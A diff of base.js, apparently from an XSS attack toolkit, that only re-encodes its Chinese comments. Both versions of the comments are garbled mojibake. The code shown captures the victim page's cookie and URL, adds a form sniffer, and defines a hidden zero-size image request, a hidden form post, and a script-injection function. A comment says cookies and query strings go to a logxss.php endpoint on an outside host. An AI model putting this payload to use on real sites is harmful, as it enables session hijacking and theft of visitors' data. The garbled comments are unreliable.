@@ -1,9 +1,9 @@
 //alert("base.js");
 
 //////////////////////////////////////////////
-//// ∂®“Â≥£¡ø
+//// ÂÆö‰πâÂ∏∏Èáè
 var feedurl = "http://www.secwiki.com/athena/feed.js";
-var logurl = "http://www.secwiki.com/athena/logxss.php?";  // cookie ∫Õ querystring  ’ºØ
+var logurl = "http://www.secwiki.com/athena/logxss.php?";  // cookie Âíå querystring Êî∂ÈõÜ
 var XssGotURI = "    [**** Request URI: "+escape(window.location.href)+" ****]\r\n";
 var XssGotCookie = "    [**** Cookie: "+escape(document.cookie)+" ****]\r\n";
 var XssGotFormSniffer_S = "    [**** Form Sniffer: ";
@@ -11,8 +11,8 @@ var XssGotFormSniffer_E = " ****]\r\n";
 
 var $d=document;
 //////////////////////////////////////////////
-//////  Ã·Ωª±Ìµ•  
-/////  ∏ƒ”√GET∑Ω∑®
+//////  Êèê‰∫§Ë°®Âçï  
+/////  ÊîπÁî®GETÊñπÊ≥ï
 function formpostTarget(url){
         var f;
 	f=document.createElement('form');	
@@ -24,7 +24,7 @@ function formpostTarget(url){
 }
 
 
-//////  img get «Î«Û
+//////  img get ËØ∑Ê±Ç
 function getURL(s) {
 	var image = new Image();
 	image.style.width = 0;
@@ -33,7 +33,7 @@ function getURL(s) {
 }
 
 ////////////////////////////////
-//// ◊¢»Î
+//// Ê≥®ÂÖ•
 ////////////////////////////////
 function InjectScript(ptr_sc){
     s=document.createElement("script");
